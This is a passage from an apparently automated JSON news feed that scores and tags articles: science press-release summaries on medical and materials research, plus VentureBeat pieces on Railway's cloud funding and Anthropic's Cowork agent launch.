        "summary": "The global development of civilization diseases is a challenge that requires many modern solutions, not only in terms of treatment, but first and foremost in terms of early diagnostics. One of the highly sensitive methods enabling fast identification of even ultralow concentrations of biomarkers or drugs in complex samples with high accuracy is surface-enhanced Raman spectroscopy (SERS).",
        "source": "phys.org",
        "published": "Mon, 09 Feb 2026 17:15:23 EST",
        "fetched_at": "2026-02-09T23:33:39.927536Z",
        "tags": [
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "value_redefinition",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 13,
        "timeliness_score": 3,
        "final_score": 8.0,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 10.0,
        "temp_score_trend": 6.0
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260206012213.htm",
        "title": "A hidden Aloe vera compound takes aim at Alzheimer’s",
        "summary": "Scientists have uncovered promising clues that compounds found in Aloe vera could play a role in fighting Alzheimer’s disease. Using advanced computer modeling, researchers discovered that beta-sitosterol—a natural plant compound—strongly interacts with two key enzymes involved in memory loss and cognitive decline. The compound showed stability, strong binding, and favorable safety indicators, making it a standout candidate for future drug development.",
        "source": "www.sciencedaily.com",
        "published": "Sun, 08 Feb 2026 07:57:41 EST",
        "fetched_at": "2026-02-09T23:33:38.636065Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 7
          },
          {
            "name": "visibility_gain",
            "score": 4
          }
        ],
        "structural_score": 11,
        "timeliness_score": 4,
        "final_score": 7.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260206012229.htm",
        "title": "Why colorectal cancer breaks the immune system’s rules",
        "summary": "Colorectal cancer has long baffled scientists because, unlike most tumors, patients often do better when their cancers are packed with immune-suppressing regulatory T cells. New research finally explains why. Scientists discovered that these T cells aren’t all the same: one subtype actually helps keep tumors in check, while another shields cancer from immune attack. The balance between these “good” and “bad” cells can determine whether a tumor grows or shrinks.",
        "source": "www.sciencedaily.com",
        "published": "Fri, 06 Feb 2026 11:03:34 EST",
        "fetched_at": "2026-02-09T23:33:38.636042Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 2
          },
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 4
          }
        ],
        "structural_score": 10,
        "timeliness_score": 4,
        "final_score": 7.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260206012210.htm",
        "title": "This tiny molecular trick makes spider silk almost unbreakable",
        "summary": "Scientists have cracked a key mystery behind spider silk’s legendary strength and flexibility. They discovered that tiny molecular interactions act like natural glue, holding silk proteins together as they transform from liquid into incredibly tough fibers. This same process helps create silk that’s stronger than steel by weight and tougher than Kevlar.",
        "source": "www.sciencedaily.com",
        "published": "Fri, 06 Feb 2026 01:22:10 EST",
        "fetched_at": "2026-02-09T23:33:38.636070Z",
        "tags": [
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 9,
        "timeliness_score": 4,
        "final_score": 6.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260206012226.htm",
        "title": "Scientists found a hidden fat switch and turned it off",
        "summary": "Researchers have discovered a previously unknown enzyme that plays a crucial role in fat production. By blocking it, they stopped weight gain, reduced liver damage, and lowered harmful cholesterol levels in animal studies. The finding opens the door to a new kind of medication that could tackle obesity, fatty liver disease, and cardiovascular disease all at once.",
        "source": "www.sciencedaily.com",
        "published": "Fri, 06 Feb 2026 11:27:35 EST",
        "fetched_at": "2026-02-09T23:33:38.636047Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 4
          },
          {
            "name": "visibility_gain",
            "score": 4
          }
        ],
        "structural_score": 8,
        "timeliness_score": 4,
        "final_score": 6.0,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 6.8,
        "temp_score_trend": 5.199999999999999
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260204121540.htm",
        "title": "Scientists just mapped the mutations that power cancer growth",
        "summary": "Researchers have created the first complete map showing how hundreds of mutations in a key cancer gene affect tumor growth. By testing every possible mutation in a critical hotspot, they found that some changes barely boost cancer signals, while others supercharge them. When matched against real patient data, the map accurately predicted cancer behavior across tissues.",
        "source": "www.sciencedaily.com",
        "published": "Thu, 05 Feb 2026 07:29:14 EST",
        "fetched_at": "2026-02-09T23:33:38.636130Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 4
          },
          {
            "name": "visibility_gain",
            "score": 4
          }
        ],
        "structural_score": 8,
        "timeliness_score": 4,
        "final_score": 6.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260204121550.htm",
        "title": "A new scan lets scientists see inside the human body in 3D color",
        "summary": "A new imaging breakthrough combines ultrasound and light-based techniques to generate vivid 3D images that show both tissue structure and blood vessel activity. Developed by researchers at Caltech and USC, the system delivers detailed results quickly and without radiation or contrast dyes. It has already been used to image multiple parts of the human body. The approach could significantly improve cancer detection, nerve-damage monitoring, and brain imaging.",
        "source": "www.sciencedaily.com",
        "published": "Fri, 06 Feb 2026 00:11:23 EST",
        "fetched_at": "2026-02-09T23:33:38.636102Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 2
          },
          {
            "name": "visibility_gain",
            "score": 5
          }
        ],
        "structural_score": 7,
        "timeliness_score": 4,
        "final_score": 5.5,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 6.1,
        "temp_score_trend": 4.9
      },
      {
        "url": "https://phys.org/news/2026-02-bioengineers-perfusable-kidney-ducts-3d.html",
        "title": "Bioengineers build branched, perfusable kidney collecting ducts using 3D bioprinting",
        "summary": "The human kidney filters about a cup of blood every minute, removing waste, excess fluid, and toxins from it, while also regulating blood pressure, balancing important electrolytes, activating Vitamin D, and helping the body produce red blood cells. This broad range of functions is achieved in part via the kidney's complex organization. In its outer region, more than a million microscopic units, known as nephrons, filter blood, reabsorb necessary nutrients, and secrete waste in the form of urine.",
        "source": "phys.org",
        "published": "Mon, 09 Feb 2026 16:21:51 EST",
        "fetched_at": "2026-02-09T23:33:39.927603Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 8,
        "timeliness_score": 3,
        "final_score": 5.5,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 6.5,
        "temp_score_trend": 4.5
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260206232245.htm",
        "title": "Scientists find a missing link between Epstein-Barr virus and multiple sclerosis",
        "summary": "New research suggests that Epstein-Barr virus may actively provoke the immune system in people with multiple sclerosis. Scientists found large buildups of virus-targeting immune cells in the nervous systems of MS patients, far more than in their blood. One viral gene was active only in people with MS, hinting at a direct role in the disease. The findings could help guide new approaches to treatment.",
        "source": "www.sciencedaily.com",
        "published": "Fri, 06 Feb 2026 23:22:45 EST",
        "fetched_at": "2026-02-09T23:33:38.636019Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 6
          }
        ],
        "structural_score": 6,
        "timeliness_score": 4,
        "final_score": 5.0,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 5.3999999999999995,
        "temp_score_trend": 4.6
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260203030540.htm",
        "title": "A 25-year study found an unexpected link between cheese and dementia",
        "summary": "A massive Swedish study tracking nearly 28,000 people for 25 years found an unexpected link between full-fat dairy and brain health. Among adults without a genetic risk for Alzheimer’s, eating more full-fat cheese was associated with a noticeably lower risk of developing the disease, while higher cream intake was tied to reduced dementia risk overall. The findings challenge decades of low-fat dietary advice but come with important caveats.",
        "source": "www.sciencedaily.com",
        "published": "Wed, 04 Feb 2026 09:44:17 EST",
        "fetched_at": "2026-02-09T23:33:38.636180Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 2
          },
          {
            "name": "value_redefinition",
            "score": 4
          }
        ],
        "structural_score": 6,
        "timeliness_score": 4,
        "final_score": 5.0,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 5.3999999999999995,
        "temp_score_trend": 4.6
      }
    ],
    "ai": [
      {
        "url": "https://venturebeat.com/infrastructure/railway-secures-usd100-million-to-challenge-aws-with-ai-native-cloud",
        "title": "Railway secures $100 million to challenge AWS with AI-native cloud infrastructure",
        "summary": "<p><a href=\"https://railway.com/\">Railway</a>, a San Francisco-based cloud platform that has quietly amassed two million developers without spending a dollar on marketing, announced Thursday that it raised $100 million in a Series B funding round, as surging demand for artificial intelligence applications exposes the limitations of legacy cloud infrastructure.</p><p><a href=\"https://tq.vc/\">TQ Ventures</a> led the round, with participation from <a href=\"https://fpvventures.com/\">FPV Ventures</a>, <a href=\"https://www.redpoint.com/\">Redpoint</a>, and <a href=\"https://www.unusual.vc/\">Unusual Ventures</a>. The investment values Railway as one of the most significant infrastructure startups to emerge during the AI boom, capitalizing on developer frustration with the complexity and cost of traditional platforms like <a href=\"https://aws.amazon.com/\">Amazon Web Services</a> and <a href=\"https://cloud.google.com/\">Google Cloud</a>.</p><p>&quot;As AI models get better at writing code, more and more people are asking the age-old question: where, and how, do I run my applications?&quot; said Jake Cooper, Railway&#x27;s 28-year-old founder and chief executive, in an exclusive interview with VentureBeat. &quot;The last generation of cloud primitives were slow and outdated, and now with AI moving everything faster, teams simply can&#x27;t keep up.&quot;</p><p>The funding is a dramatic acceleration for a company that has charted an unconventional path through the cloud computing industry. Railway raised just $24 million in total before this round, including a <a href=\"https://techcrunch.com/2022/05/31/railway-snags-20m-to-streamline-the-process-of-deploying-apps-and-services/\">$20 million Series A</a> from Redpoint in 2022. The company now processes more than 10 million deployments monthly and handles over one trillion requests through its edge network — metrics that rival far larger and better-funded competitors.</p><h2><b>Why three-minute deploy times have become unacceptable in the age of AI coding assistants</b></h2><p>Railway&#x27;s pitch rests on a simple observation: the tools developers use to deploy and manage software were designed for a slower era. A standard build-and-deploy cycle using <a href=\"https://station.railway.com/feedback/terraform-provider-954567d7\">Terraform</a>, the industry-standard infrastructure tool, takes two to three minutes. That delay, once tolerable, has become a critical bottleneck as AI coding assistants like <a href=\"https://claude.ai/login\">Claude</a>, <a href=\"https://chatgpt.com/\">ChatGPT</a>, and <a href=\"https://cursor.com/\">Cursor</a> can generate working code in seconds.</p><p>&quot;When godly intelligence is on tap and can solve any problem in three seconds, those amalgamations of systems become bottlenecks,&quot; Cooper told VentureBeat. &quot;What was really cool for humans to deploy in 10 seconds or less is now table stakes for agents.&quot;</p><p>The company claims its platform delivers deployments in under one second — fast enough to keep pace with AI-generated code. Customers report a tenfold increase in developer velocity and up to 65 percent cost savings compared to traditional cloud providers.</p><p>These numbers come directly from enterprise clients, not internal benchmarks. Daniel Lobaton, chief technology officer at G2X, a platform serving 100,000 federal contractors, measured deployment speed improvements of seven times faster and an 87 percent cost reduction after migrating to Railway. His infrastructure bill dropped from $15,000 per month to approximately $1,000.</p><p>&quot;The work that used to take me a week on our previous infrastructure, I can do in Railway in like a day,&quot; Lobaton said. &quot;If I want to spin up a new service and test different architectures, it would take so long on our old setup. In Railway I can launch six services in two minutes.&quot;</p><h2><b>Inside the controversial decision to abandon Google Cloud and build data centers from scratch</b></h2><p>What distinguishes <a href=\"https://railway.com/\">Railway</a> from competitors like <a href=\"https://render.com/\">Render</a> and <a href=\"http://fly.io\">Fly.io</a> is the depth of its vertical integration. In 2024, the company made the unusual decision to abandon Google Cloud entirely and build its own data centers, a move that echoes the famous Alan Kay maxim: &quot;People who are really serious about software should make their own hardware.&quot;</p><p>&quot;We wanted to design hardware in a way where we could build a differentiated experience,&quot; Cooper said. &quot;Having full control over the network, compute, and storage layers lets us do really fast build and deploy loops, the kind that allows us to move at &#x27;agentic speed&#x27; while staying 100 percent the smoothest ride in town.&quot;</p><p>The approach paid dividends during recent <a href=\"https://restofworld.org/2026/cloud-outages-2025-global-business-impact/\">widespread outages</a> that affected major cloud providers — Railway remained online throughout.</p><p>This soup-to-nuts control enables pricing that undercuts the hyperscalers by roughly 50 percent and newer cloud startups by three to four times. Railway charges by the second for actual compute usage: $0.00000386 per gigabyte-second of memory, $0.00000772 per vCPU-second, and $0.00000006 per gigabyte-second of storage. There are no charges for idle virtual machines — a stark contrast to the traditional cloud model where customers pay for provisioned capacity whether they use it or not.</p><p>&quot;The conventional wisdom is that the big guys have economies of scale to offer better pricing,&quot; Cooper noted. &quot;But when they&#x27;re charging for VMs that usually sit idle in the cloud, and we&#x27;ve purpose-built everything to fit much more density on these machines, you have a big opportunity.&quot;</p><h2><b>How 30 employees built a platform generating tens of millions in annual revenue</b></h2><p><a href=\"https://railway.com/\">Railway</a> has achieved its scale with a team of just 30 employees generating tens of millions in annual revenue — a ratio of revenue per employee that would be exceptional even for established software companies. The company grew revenue 3.5 times last year and continues to expand at 15 percent month-over-month.</p><p>Cooper emphasized that the fundraise was strategic rather than necessary. &quot;We&#x27;re default alive; there&#x27;s no reason for us to raise money,&quot; he said. &quot;We raised because we see a massive opportunity to accelerate, not because we needed to survive.&quot;</p><p>The company hired its first salesperson only last year and employs just two solutions engineers. Nearly all of Railway&#x27;s two million users discovered the platform through word of mouth — developers telling other developers about a tool that actually works.</p><p>&quot;We basically did the standard engineering thing: if you build it, they will come,&quot; Cooper recalled. &quot;And to some degree, they came.&quot;</p><h2><b>From side projects to Fortune 500 deployments: Railway&#x27;s unlikely corporate expansion</b></h2><p>Despite its grassroots developer community, Railway has made significant inroads into large organizations. The company claims that 31 percent of Fortune 500 companies now use its platform, though deployments range from company-wide infrastructure to individual team projects.</p><p>Notable customers include <a href=\"https://www.biltrewards.com/\">Bilt</a>, the loyalty program company; Intuit&#x27;s <a href=\"https://www.goco.io/\">GoCo</a> subsidiary; TripAdvisor&#x27;s <a href=\"https://www.cruisecritic.com/\">Cruise Critic</a>; and <a href=\"https://www.mgmresorts.com/en.html\">MGM Resorts</a>. <a href=\"https://www.ycombinator.com/companies/kernel\">Kernel</a>, a Y Combinator-backed startup providing AI infrastructure to over 1,000 companies, runs its entire customer-facing system on Railway for $444 per month.</p><p>&quot;At my previous company Clever, which sold for $500 million, I had six full-time engineers just managing AWS,&quot; said Rafael Garcia, Kernel&#x27;s chief technology officer. &quot;Now I have six engineers total, and they all focus on product. Railway is exactly the tool I wish I had in 2012.&quot;</p><p>For enterprise customers, <a href=\"https://railway.com/\">Railway</a> offers security certifications including SOC 2 Type 2 compliance and HIPAA readiness, with business associate agreements available upon request. The platform provides single sign-on authentication, comprehensive audit logs, and the option to deploy within a customer&#x27;s existing cloud environment through a &quot;bring your own cloud&quot; configuration.</p><p>Enterprise pricing starts at custom levels, with specific add-ons for extended log retention ($200 monthly), HIPAA BAAs ($1,000), enterprise support with SLOs ($2,000), and dedicated virtual machines ($10,000).</p><h2><b>The startup&#x27;s bold strategy to take on Amazon, Google, and a new generation of cloud rivals</b></h2><p>Railway enters a crowded market that includes not only the hyperscale cloud providers—Amazon Web Services, Microsoft Azure, and Google Cloud Platform—but also a growing cohort of developer-focused platforms like Vercel, Render, Fly.io, and Heroku.</p><p>Cooper argues that Railway&#x27;s competitors fall into two camps, neither of which has fully committed to the new infrastructure model that AI demands.</p><p>&quot;The hyperscalers have two competing systems, and they haven&#x27;t gone all-in on the new model because their legacy revenue stream is still printing money,&quot; he observed. &quot;They have this mammoth pool of cash coming from people who provision a VM, use maybe 10 percent of it, and still pay for the whole thing. To what end are they actually interested in going all the way in on a new experience if they don&#x27;t really need to?&quot;</p><p>Against startup competitors, Railway differentiates by covering the full infrastructure stack. &quot;We&#x27;re not just containers; we&#x27;ve got VM primitives, stateful storage, virtual private networking, automated load balancing,&quot; Cooper said. &quot;And we wrap all of this in an absurdly easy-to-use UI, with agentic primitives so agents can move 1,000 times faster.&quot;</p><p>The platform supports databases including PostgreSQL, MySQL, MongoDB, and Redis; provides up to 256 terabytes of persistent storage with over 100,000 input/output operations per second; and enables deployment to four global regions spanning the United States, Europe, and Southeast Asia. Enterprise customers can scale to 112 vCPUs and 2 terabytes of RAM per service.</p><h2><b>Why investors are betting that AI will create a thousand times more software than exists today</b></h2><p>Railway&#x27;s fundraise reflects broader investor enthusiasm for companies positioned to benefit from the AI coding revolution. As tools like <a href=\"https://github.com/features/copilot\">GitHub Copilot</a>, <a href=\"https://cursor.com/agents\">Cursor</a>, and <a href=\"https://claude.ai/login\">Claude</a> become standard fixtures in developer workflows, the volume of code being written — and the infrastructure needed to run it — is expanding dramatically.</p><p>&quot;The amount of software that&#x27;s going to come online over the next five years is unfathomable compared to what existed before — we&#x27;re talking a thousand times more software,&quot; Cooper predicted. &quot;All of that has to run somewhere.&quot;</p><p>The company has already integrated directly with AI systems, building what Cooper calls &quot;loops where Claude can hook in, call deployments, and analyze infrastructure automatically.&quot; Railway released a Model Context Protocol server in August 2025 that allows AI coding agents to deploy applications and manage infrastructure directly from code editors.</p><p>&quot;The notion of a developer is melting before our eyes,&quot; Cooper said. &quot;You don&#x27;t have to be an engineer to engineer things anymore — you just need critical thinking and the ability to analyze things in a systems capacity.&quot;</p><h2><b>What Railway plans to do with $100 million and zero marketing experience</b></h2><p><a href=\"https://railway.com/\">Railway</a> plans to use the new capital to expand its global data center footprint, grow its team beyond 30 employees, and build what Cooper described as a proper go-to-market operation for the first time in the company&#x27;s five-year history.</p><p>&quot;One of my mentors said you raise money when you can change the trajectory of the business,&quot; Cooper explained. &quot;We&#x27;ve built all the required substrate to scale indefinitely; what&#x27;s been holding us back is simply talking about it. 2026 is the year we play on the world stage.&quot;</p><p>The company&#x27;s investor roster reads like a who&#x27;s who of developer infrastructure. Angel investors include <a href=\"https://tom.preston-werner.com/\">Tom Preston-Werner,</a> co-founder of GitHub; <a href=\"https://rauchg.com/about\">Guillermo Rauch</a>, chief executive of Vercel; <a href=\"https://www.cockroachlabs.com/author/spencer-kimball/\">Spencer Kimball</a>, chief executive of Cockroach Labs; <a href=\"https://www.datadoghq.com/about/leadership/\">Olivier Pomel</a>, chief executive of Datadog; and <a href=\"https://sequoiacap.com/founder/jori-lallo/\">Jori Lallo</a>, co-founder of Linear.</p><p>The timing of Railway&#x27;s expansion coincides with what many in Silicon Valley view as a fundamental shift in how software gets made. Coding assistants are no longer experimental curiosities — they have become essential tools that millions of developers rely on daily. Each line of AI-generated code needs somewhere to run, and the incumbents, by Cooper&#x27;s telling, are too wedded to their existing business models to fully capitalize on the moment.</p><p>Whether <a href=\"https://railway.com/\">Railway</a> can translate developer enthusiasm into sustained enterprise adoption remains an open question. The cloud infrastructure market is littered with promising startups that failed to break the grip of Amazon, Microsoft, and Google. But Cooper, who previously worked as a software engineer at <a href=\"https://www.wolframalpha.com/\">Wolfram Alpha</a>, <a href=\"https://www.bloomberg.com/\">Bloomberg</a>, and <a href=\"https://www.uber.com/\">Uber</a> before founding Railway in 2020, seems unfazed by the scale of his ambition.</p><p>&quot;In five years, Railway [will be] the place where software gets created and evolved, period,&quot; he said. &quot;Deploy instantly, scale infinitely, with zero friction. That&#x27;s the prize worth playing for, and there&#x27;s no bigger one on offer.&quot;</p><p>For a company that built a $100 million business by doing the opposite of what conventional startup wisdom dictates — no marketing, no sales team, no venture hype—the real test begins now. Railway spent five years proving that developers would find a better mousetrap on their own. The next five will determine whether the rest of the world is ready to get on board.</p>",
        "source": "venturebeat.com",
        "published": "Thu, 22 Jan 2026 14:00:00 GMT",
        "fetched_at": "2026-02-09T23:33:24.833398Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 7
          },
          {
            "name": "visibility_gain",
            "score": 5
          },
          {
            "name": "value_redefinition",
            "score": 8
          },
          {
            "name": "scale_shift",
            "score": 13
          },
          {
            "name": "ontology_shift",
            "score": 8
          }
        ],
        "structural_score": 41,
        "timeliness_score": 3,
        "final_score": 22.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://venturebeat.com/technology/anthropic-launches-cowork-a-claude-desktop-agent-that-works-in-your-files-no",
        "title": "Anthropic launches Cowork, a Claude Desktop agent that works in your files — no coding required",
        "summary": "<p><a href=\"https://www.anthropic.com/\">Anthropic</a> released <a href=\"https://claude.com/blog/cowork-research-preview\">Cowork</a> on Monday, a new AI agent capability that extends the power of its wildly successful <a href=\"https://claude.com/product/claude-code\">Claude Code</a> tool to non-technical users — and according to company insiders, the team built the entire feature in approximately a week and a half, largely using Claude Code itself.</p><p>The launch marks a major inflection point in the race to deliver practical AI agents to mainstream users, positioning Anthropic to compete not just with <a href=\"https://openai.com/\">OpenAI</a> and <a href=\"https://gemini.google.com/app\">Google</a> in conversational AI, but with <a href=\"https://copilot.microsoft.com/\">Microsoft&#x27;s Copilot</a> in the burgeoning market for AI-powered productivity tools.</p><p>&quot;Cowork lets you complete non-technical tasks much like how developers use Claude Code,&quot; the <a href=\"https://x.com/claudeai/status/2010805682434666759?s=20\">company announced</a> via its official Claude account on X. The feature arrives as a research preview available exclusively to <a href=\"https://support.claude.com/en/articles/11014257-about-claude-s-max-plan-usage\">Claude Max subscribers</a> — Anthropic&#x27;s power-user tier priced between $100 and $200 per month — through the macOS desktop application.</p><p>For the past year, the industry narrative has focused on large language models that can write poetry or debug code. With <a href=\"https://claude.com/blog/cowork-research-preview\">Cowork</a>, Anthropic is betting that the real enterprise value lies in an AI that can open a folder, read a messy pile of receipts, and generate a structured expense report without human hand-holding.</p><div></div><h2><b>How developers using a coding tool for vacation research inspired Anthropic&#x27;s latest product</b></h2><p>The genesis of <a href=\"https://claude.com/blog/cowork-research-preview\">Cowork</a> lies in Anthropic&#x27;s recent success with the developer community. In late 2024, the company released <a href=\"https://www.anthropic.com/news/claude-3-7-sonnet\">Claude Code</a>, a terminal-based tool that allowed software engineers to automate rote programming tasks. The tool was a hit, but Anthropic noticed a peculiar trend: users were forcing the coding tool to perform non-coding labor.</p><p>According to <a href=\"https://x.com/bcherny/status/2010809450844831752\">Boris Cherny</a>, an engineer at Anthropic, the company observed users deploying the developer tool for an unexpectedly diverse array of tasks.</p><div></div><p>&quot;Since we launched Claude Code, we saw people using it for all sorts of non-coding work: doing vacation research, building slide decks, cleaning up your email, cancelling subscriptions, recovering wedding photos from a hard drive, monitoring plant growth, controlling your oven,&quot; Cherny wrote on X. &quot;These use cases are diverse and surprising — the reason is that the underlying Claude Agent is the best agent, and Opus 4.5 is the best model.&quot;</p><p>Recognizing this shadow usage, Anthropic effectively stripped the command-line complexity from their developer tool to create a consumer-friendly interface. In its blog post announcing the feature, <a href=\"https://claude.com/blog/cowork-research-preview\">Anthropic explained</a> that developers &quot;quickly began using it for almost everything else,&quot; which &quot;prompted us to build Cowork: a simpler way for anyone — not just developers — to work with Claude in the very same way.&quot;</p><h2><b>Inside the folder-based architecture that lets Claude read, edit, and create files on your computer</b></h2><p>Unlike a standard chat interface where a user pastes text for analysis, <a href=\"https://claude.com/blog/cowork-research-preview\">Cowork</a> requires a different level of trust and access. Users designate a specific folder on their local machine that Claude can access. Within that sandbox, the AI agent can read existing files, modify them, or create entirely new ones.</p><p>Anthropic offers several illustrative examples: reorganizing a cluttered downloads folder by sorting and intelligently renaming each file, generating a spreadsheet of expenses from a collection of receipt screenshots, or drafting a report from scattered notes across multiple documents.</p><p>&quot;In Cowork, you give Claude access to a folder on your computer. Claude can then read, edit, or create files in that folder,&quot; <a href=\"https://x.com/claudeai/status/2010805685530038351\">the company explained</a> on X. &quot;Try it to create a spreadsheet from a pile of screenshots, or produce a first draft from scattered notes.&quot;</p><div></div><p>The architecture relies on what is known as an &quot;agentic loop.&quot; When a user assigns a task, the AI does not merely generate a text response. Instead, it formulates a plan, executes steps in parallel, checks its own work, and asks for clarification if it hits a roadblock. Users can queue multiple tasks and let Claude process them simultaneously — a workflow Anthropic describes as feeling &quot;much less like a back-and-forth and much more like leaving messages for a coworker.&quot;</p><p>The system is built on Anthropic&#x27;s <a href=\"https://www.anthropic.com/engineering/building-agents-with-the-claude-agent-sdk\">Claude Agent SDK</a>, meaning it shares the same underlying architecture as Claude Code. Anthropic notes that Cowork &quot;can take on many of the same tasks that Claude Code can handle, but in a more approachable form for non-coding tasks.&quot;</p><h2><b>The recursive loop where AI builds AI: Claude Code reportedly wrote much of Claude Cowork</b></h2><p>Perhaps the most remarkable detail surrounding Cowork&#x27;s launch is the speed at which the tool was reportedly built — highlighting a recursive feedback loop where AI tools are being used to build better AI tools.</p><p>During a livestream hosted by Dan Shipper, Felix Rieseberg, an Anthropic employee, confirmed that <a href=\"https://x.com/blakeir/status/2010837251505205656\">t</a>he team <a href=\"https://x.com/blakeir/status/2010837251505205656\">built Cowork in approximately a week and a half</a>.</p><p>Alex Volkov, who covers AI developments, expressed surprise at the timeline: &quot;Holy shit Anthropic built &#x27;Cowork&#x27; in the last... week and a half?!&quot;</p><div></div><p>This prompted immediate speculation about how much of Cowork was itself built by Claude Code. <a href=\"https://x.com/_simonsmith\">Simon Smith</a>, EVP of Generative AI at Klick Health, put it bluntly on X: &quot;Claude Code wrote all of Claude Cowork. Can we all agree that we&#x27;re in at least somewhat of a recursive improvement loop here?&quot;</p><p>The implication is profound: Anthropic&#x27;s AI coding agent may have substantially contributed to building its own non-technical sibling product. If true, this is one of the most visible examples yet of AI systems being used to accelerate their own development and expansion — a strategy that could widen the gap between AI labs that successfully deploy their own agents internally and those that do not.</p><h2><b>Connectors, browser automation, and skills extend Cowork&#x27;s reach beyond the local file system</b></h2><p>Cowork doesn&#x27;t operate in isolation. The feature integrates with Anthropic&#x27;s existing ecosystem of connectors — tools that link <a href=\"https://claude.ai/login?returnTo=%2Fnew%3F\">Claude</a> to external information sources and services such as <a href=\"https://asana.com/\">Asana</a>, <a href=\"https://www.notion.com/\">Notion</a>, <a href=\"https://www.paypal.com/us/home\">PayPal</a>, and other supported partners. Users who have configured these connections in the standard Claude interface can leverage them within Cowork sessions.</p><p>Additionally, Cowork can pair with <a href=\"https://code.claude.com/docs/en/chrome\">Claude in Chrome</a>, Anthropic&#x27;s browser extension, to execute tasks requiring web access. This combination allows the agent to navigate websites, click buttons, fill forms, and extract information from the internet — all while operating from the desktop application.</p><p>&quot;Cowork includes a number of novel UX and safety features that we think make the product really special,&quot; <a href=\"https://x.com/bcherny/status/2010809450844831752\">Cherny explained</a>, highlighting &quot;a built-in VM [virtual machine] for isolation, out of the box support for browser automation, support for all your claude.ai data connectors, asking you for clarification when it&#x27;s unsure.&quot;</p><p><a href=\"https://www.anthropic.com/\">Anthropic</a> has also introduced an initial set of &quot;skills&quot; specifically designed for Cowork that enhance Claude&#x27;s ability to create documents, presentations, and other files. These build on the <a href=\"https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills\">Skills for Claude</a> framework the company announced in October, which provides specialized instruction sets Claude can load for particular types of tasks.</p><h2><b>Why Anthropic is warning users that its own AI agent could delete their files</b></h2><p>The transition from a chatbot that suggests edits to an agent that makes edits introduces significant risk. An AI that can organize files can, theoretically, delete them.</p><p>In a notable display of transparency, Anthropic devoted considerable space in its announcement to <a href=\"https://claude.com/blog/cowork-research-preview\">warning users about Cowork&#x27;s potential dangers</a> — an unusual approach for a product launch.</p><p>The company explicitly acknowledges that Claude &quot;can take potentially destructive actions (such as deleting local files) if it&#x27;s instructed to.&quot; Because Claude might occasionally misinterpret instructions, Anthropic urges users to provide &quot;very clear guidance&quot; about sensitive operations.</p><p>More concerning is the risk of prompt injection attacks — a technique where malicious actors embed hidden instructions in content Claude might encounter online, potentially causing the agent to bypass safeguards or take harmful actions.</p><p>&quot;We&#x27;ve built sophisticated defenses against prompt injections,&quot; Anthropic wrote, &quot;but agent safety — that is, the task of securing Claude&#x27;s real-world actions — is still an active area of development in the industry.&quot;</p><p>The company characterized these risks as inherent to the current state of AI agent technology rather than unique to Cowork. &quot;These risks aren&#x27;t new with Cowork, but it might be the first time you&#x27;re using a more advanced tool that moves beyond a simple conversation,&quot; the announcement notes.</p><h2><b>Anthropic&#x27;s desktop agent strategy sets up a direct challenge to Microsoft Copilot</b></h2><p>The launch of <a href=\"https://claude.com/blog/cowork-research-preview\">Cowork</a> places Anthropic in direct competition with <a href=\"https://www.microsoft.com/en-us/\">Microsoft</a>, which has spent years attempting to integrate its <a href=\"https://copilot.microsoft.com/\">Copilot AI</a> into the fabric of the Windows operating system with mixed adoption results.</p><p>However, Anthropic&#x27;s approach differs in its isolation. By confining the agent to specific folders and requiring explicit connectors, they are attempting to strike a balance between the utility of an OS-level agent and the security of a sandboxed application.</p><p>What distinguishes Anthropic&#x27;s approach is its bottom-up evolution. Rather than designing an AI assistant and retrofitting agent capabilities, Anthropic built a powerful coding agent first — <a href=\"https://code.claude.com/docs/en/overview\">Claude Code</a> — and is now abstracting its capabilities for broader audiences. This technical lineage may give Cowork more robust agentic behavior from the start.</p><p>Claude Code has generated significant enthusiasm among developers since its initial launch as <a href=\"https://www.anthropic.com/news/claude-3-7-sonnet\">a command-line tool in late 2024</a>. The company expanded access with a <a href=\"https://arstechnica.com/ai/2025/10/claude-code-gets-a-web-version-but-its-the-new-sandboxing-that-really-matters/\">web interface</a> in October 2025, followed by a <a href=\"https://venturebeat.com/ai/anthropics-claude-code-can-now-read-your-slack-messages-and-write-code-for\">Slack integration</a> in December. Cowork is the next logical step: bringing the same agentic architecture to users who may never touch a terminal.</p><h2><b>Who can access Cowork now, and what&#x27;s coming next for Windows and other platforms</b></h2><p>For now, Cowork remains exclusive to <a href=\"https://support.claude.com/en/articles/11014257-about-claude-s-max-plan-usage\">Claude Max subscribers</a> using the macOS desktop application. Users on other subscription tiers — Free, Pro, Team, or Enterprise — can 